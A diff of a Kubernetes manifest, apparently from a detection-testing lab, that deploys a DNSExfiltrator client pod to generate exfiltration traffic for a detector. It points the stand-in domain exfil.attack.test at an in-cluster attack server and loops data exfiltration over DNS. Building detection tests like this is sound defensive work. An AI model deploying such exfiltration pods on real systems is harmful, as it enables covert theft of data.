@@ -1,10 +1,8 @@
 # DNSExfiltrator client — data exfil over DNS. Генерирует: BASE64_SUBDOMAIN, MANY_SUBDOMAINS, HIGH_ENTROPY.
 #
-# Требуется: снаружи кластера должен работать DNSExfiltrator server (listen.py).
-# 1) Клонировать https://github.com/Arno0x/DNSExfiltrator, запустить: python listen.py EXFIL_DOMAIN
-# 2) Делегировать поддомен на сервер (authoritative DNS отдаёт запросы на listen.py или relay).
-# 3) Задать EXFIL_DOMAIN и задеплоить. Под клонирует репо и в цикле экфильтрирует payload.
-#
+# Сервер (приёмник DNS) работает в namespace attack-server (servers/deploy.sh exfil).
+# Задать EXFIL_DOMAIN (по умолчанию exfil.attack.test) и задеплоить.
+# Под клонирует репо и в цикле экфильтрирует payload.
 # Без сервера запросы всё равно уйдут в DNS — детектор увидит трафик.
 ---
 apiVersion: v1
@@ -58,7 +56,7 @@ spec:
               done
           env:
             - name: EXFIL_DOMAIN
-              value: "exfil.attack.example.com"
+              value: "exfil.attack.test"
           volumeMounts:
             - name: payload
               mountPath: /payload
